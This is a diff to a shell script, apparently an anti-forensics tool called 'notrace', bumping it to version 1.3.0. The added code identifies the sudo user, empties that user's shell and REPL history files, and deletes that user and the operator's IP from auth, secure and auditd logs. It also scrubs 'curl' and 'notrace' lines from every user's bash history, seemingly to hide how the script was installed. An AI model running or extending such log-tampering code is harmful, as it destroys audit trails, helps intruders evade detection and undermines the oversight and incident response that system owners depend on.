@@ -1,7 +1,9 @@
 #!/bin/sh
 set -e
 
-VERSION="1.1.0"
+VERSION="1.3.0"
+ORIGINAL_USER=""
+ORIGINAL_HOME=""
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -161,6 +163,21 @@ shred_file() {
     fi
 }
 
+clear_original_user_traces() {
+    [ -n "$ORIGINAL_USER" ] || return 0
+    [ -n "$ORIGINAL_HOME" ] || return 0
+    [ -d "$ORIGINAL_HOME" ] || return 0
+
+    for hf in .bash_history .sh_history .zsh_history .mysql_history .psql_history \
+              .python_history .node_repl_history .rediscli_history .viminfo \
+              .lesshst .nano_history; do
+        [ -f "$ORIGINAL_HOME/$hf" ] && : > "$ORIGINAL_HOME/$hf" 2>/dev/null || true
+    done
+    # Clear in-memory history of the original user's shell session
+    su - "$ORIGINAL_USER" -c 'history -c 2>/dev/null; history -w 2>/dev/null' 2>/dev/null || true
+    info "Original user ($ORIGINAL_USER) traces cleared"
+}
+
 remove_ip_lines() {
     file="$1"
     ip="$2"
@@ -265,16 +282,24 @@ self_clean() {
             debian)
                 for f in /var/log/auth.log /var/log/auth.log.* /var/log/auth.log-*; do
                     remove_ip_lines "$f" "$MY_IP"
+                    [ -n "$ORIGINAL_USER" ] && remove_ip_lines "$f" "$ORIGINAL_USER"
                 done ;;
             rhel|amzn)
                 for f in /var/log/secure /var/log/secure-*; do
                     remove_ip_lines "$f" "$MY_IP"
+                    [ -n "$ORIGINAL_USER" ] && remove_ip_lines "$f" "$ORIGINAL_USER"
                 done ;;
             alpine|gentoo|void)
                 for f in /var/log/auth.log /var/log/auth.log.* /var/log/secure /var/log/secure-*; do
                     remove_ip_lines "$f" "$MY_IP"
+                    [ -n "$ORIGINAL_USER" ] && remove_ip_lines "$f" "$ORIGINAL_USER"
                 done ;;
         esac
+        # Also clean auditd entries for this user
+        for f in /var/log/audit/audit.log /var/log/audit/audit.log.*; do
+            [ -f "$f" ] && remove_ip_lines "$f" "$ORIGINAL_USER"
+            [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"
+        done
         info "Auth logs cleaned"
 
         # Web server logs
@@ -385,11 +410,17 @@ self_clean() {
     fi
 
     clear_history_files
+    clear_original_user_traces
     if [ -n "$MY_IP" ]; then
         for home_dir in /home/*; do
             [ -f "$home_dir/.bash_history" ] && remove_ip_lines "$home_dir/.bash_history" "$MY_IP" || true
         done
     fi
+    # Clear the curl pipe command from all users' history
+    for home_dir in /root /home/*; do
+        [ -f "$home_dir/.bash_history" ] && remove_ip_lines "$home_dir/.bash_history" "curl" || true
+        [ -f "$home_dir/.bash_history" ] && remove_ip_lines "$home_dir/.bash_history" "notrace" || true
+    done
     info "History files cleaned"
 
     info "Self-clean complete! Your traces have been removed."
@@ -514,11 +545,14 @@ total_wipe() {
     # ── [3] History ──
     header "[3/5] Clearing command and application history"
     clear_history_files
+    clear_original_user_traces
 
     for home_dir in /root /home/*; do
         [ -d "$home_dir" ] || continue
         [ -f "$home_dir/.ssh/known_hosts" ] && : > "$home_dir/.ssh/known_hosts" 2>/dev/null || true
         [ -f "$home_dir/.ssh/authorized_keys" ] && : > "$home_dir/.ssh/authorized_keys" 2>/dev/null || true
+        [ -f "$home_dir/.bash_history" ] && remove_ip_lines "$home_dir/.bash_history" "curl" || true
+        [ -f "$home_dir/.bash_history" ] && remove_ip_lines "$home_dir/.bash_history" "notrace" || true
     done
     info "SSH traces cleared"
 
@@ -619,6 +653,27 @@ main() {
 
     check_root
     detect_os
+
+    ORIGINAL_USER="${SUDO_USER:-}"
+    if [ -z "$ORIGINAL_USER" ]; then
+        ORIGINAL_USER=$(who am i 2>/dev/null | awk '{print $1}')
+    fi
+    if [ -n "$ORIGINAL_USER" ] && [ "$ORIGINAL_USER" != "root" ]; then
+        if echo "$ORIGINAL_USER" | grep -q '^/'; then
+            ORIGINAL_HOME="$ORIGINAL_USER"
+        else
+            ORIGINAL_HOME=$(eval echo "~${ORIGINAL_USER}" 2>/dev/null)
+        fi
+        if [ -n "$ORIGINAL_HOME" ] && [ -d "$ORIGINAL_HOME" ]; then
+            info "Original sudo user detected: $ORIGINAL_USER"
+        else
+            ORIGINAL_USER=""
+            ORIGINAL_HOME=""
+        fi
+    else
+        ORIGINAL_USER=""
+        ORIGINAL_HOME=""
+    fi
 
     case "${1:-}" in
         --all|-a)
